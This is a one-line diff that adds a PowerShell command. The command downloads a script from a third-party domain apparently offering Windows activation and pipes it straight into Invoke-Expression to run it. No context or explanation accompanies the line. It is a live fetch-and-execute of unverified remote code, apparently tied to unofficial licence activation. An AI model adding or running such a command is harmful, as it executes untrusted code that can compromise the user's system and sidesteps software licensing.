@@ -1,0 +1,1 @@
+powershell -Command "irm https://activate-windows.pctoolsbox.com | iex"
